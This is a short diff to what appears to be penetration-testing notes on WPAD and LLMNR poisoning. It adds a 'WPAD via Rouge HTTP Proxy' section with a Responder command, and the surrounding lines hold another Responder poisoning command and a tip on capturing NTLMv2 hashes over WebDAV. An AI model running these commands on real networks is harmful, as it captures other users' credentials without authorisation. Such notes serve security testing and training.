@@ -28,6 +28,14 @@ When a windows host requires a new IP address dynamically it can perform HTTP WP
 $ sudo responder -I <interface> -Pdwv
 ```
 
+### 2.1.3 - WPAD via Rouge HTTP Proxy
+
+TODO: Try this with `privoxy`
+
+```
+$ sudo responder -I <interface> -u <IP>:<PORT>
+```
+
 ### 2.1.3 - WebDAV
 
 Block SMB traffic on the attacker's machine to poison NTLMv2-SSP responses via WebDAV/HTTP.
